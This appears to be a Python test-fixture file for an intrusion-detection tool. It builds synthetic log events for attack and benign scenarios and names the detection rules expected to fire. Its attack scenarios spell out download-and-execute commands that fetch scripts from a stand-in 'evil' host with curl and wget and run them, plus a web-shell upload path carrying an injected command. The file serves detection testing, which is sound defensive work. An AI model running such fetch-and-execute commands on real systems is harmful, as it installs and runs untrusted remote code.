import sys
import time
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.normalize import NormalizedEvent

from tests.coverage.credential_access_helper import CoverageScenario


def _auth_evt(ts, *, user="alice", host="dl-host", source="auth.log", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip="203.0.113.10",
        source=source,
        category="auth",
        action="ssh_login",
        outcome="success",
        user=user,
        message="ssh_login:success",
        fields={},
        distro_family=distro_family,
    )


def _web_evt(ts, path, *, host="dl-host", source="nginx", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        src_ip="203.0.113.200",
        source=source,
        category="web_attack",
        action="shell_upload",
        outcome="success",
        user="www-data",
        message=path,
        fields={
            "attack": "shell_upload",
            "method": "POST",
            "path": path,
            "path_lc": path.lower(),
            "path_decoded": path,
            "path_decoded_lc": path.lower(),
            "status": 200,
            "ua": "Mozilla/5.0",
            "ua_lc": "mozilla/5.0",
        },
        distro_family=distro_family,
    )


def _proc_evt(ts, cmdline, *, host="dl-host", user="alice", process=None, source="journald", distro_family="unknown"):
    return NormalizedEvent(
        ts=ts,
        host=host,
        source=source,
        category="process",
        action="process_exec",
        outcome="success",
        user=user,
        process=process or cmdline.split()[0],
        message=cmdline,
        fields={"cmdline": cmdline},
        distro_family=distro_family,
    )


def build_attack_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="debian-login-download-exec",
            events=[
                _auth_evt(now + 1, host="dl-attack-01", source="auth.log", distro_family="debian"),
                _proc_evt(now + 16, "curl -fsSL http://evil/payload.sh -o /tmp/payload.sh", host="dl-attack-01", process="curl", source="journald", distro_family="debian"),
                _proc_evt(now + 31, "chmod +x /tmp/payload.sh && /tmp/payload.sh", host="dl-attack-01", process="chmod", source="journald", distro_family="debian"),
            ],
            expected_ids={"PROC-DL-002", "SEQ-063"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="rhel-httpd-web-download-exec",
            events=[
                _web_evt(now + 2, "/uploads/shell.php.jpg?cmd=%60id%60", host="dl-attack-02", source="apache2", distro_family="rhel"),
                _proc_evt(now + 17, "wget -qO /tmp/agent.sh http://evil/agent.sh", host="dl-attack-02", user="apache", process="wget", source="auditd", distro_family="rhel"),
                _proc_evt(now + 32, "sh /tmp/agent.sh", host="dl-attack-02", user="apache", process="sh", source="auditd", distro_family="rhel"),
            ],
            expected_ids={"PROC-DL-002", "SEQ-064"},
            forbidden_ids=set(),
            kind="attack",
        ),
        CoverageScenario(
            name="suse-inline-fetch-exec",
            events=[
                _proc_evt(now + 3, 'bash -c "$(curl -fsSL http://evil/p.sh)"', host="dl-attack-03", user="root", process="bash", source="syslog", distro_family="suse"),
            ],
            expected_ids={"PROC-DL-001"},
            forbidden_ids=set(),
            kind="attack",
        ),
    ]


def build_benign_scenarios() -> List[CoverageScenario]:
    now = time.time()
    return [
        CoverageScenario(
            name="debian-deb-fetch",
            events=[
                _proc_evt(now + 101, "curl -fsS https://repo.example.com/pool/main/a/agent/agent_1.2.3_amd64.deb -o /tmp/agent_1.2.3_amd64.deb", host="dl-benign-01", user="root", process="curl", source="journald", distro_family="debian"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-DL-001", "PROC-DL-002", "SEQ-063"},
            kind="benign",
        ),
        CoverageScenario(
            name="rhel-rpm-fetch",
            events=[
                _proc_evt(now + 102, "curl -fsS https://mirror.example.com/baseos/pkg.rpm -o /tmp/pkg.rpm", host="dl-benign-02", user="root", process="curl", source="auditd", distro_family="rhel"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-DL-001", "PROC-DL-002", "SEQ-064"},
            kind="benign",
        ),
        CoverageScenario(
            name="suse-repodata-fetch",
            events=[
                _proc_evt(now + 103, "wget -qO /tmp/repomd.xml https://updates.example.com/repo/oss/repodata/repomd.xml", host="dl-benign-03", user="root", process="wget", source="syslog", distro_family="suse"),
            ],
            expected_ids=set(),
            forbidden_ids={"PROC-DL-001", "PROC-DL-002", "SEQ-063"},
            kind="benign",
        ),
    ]
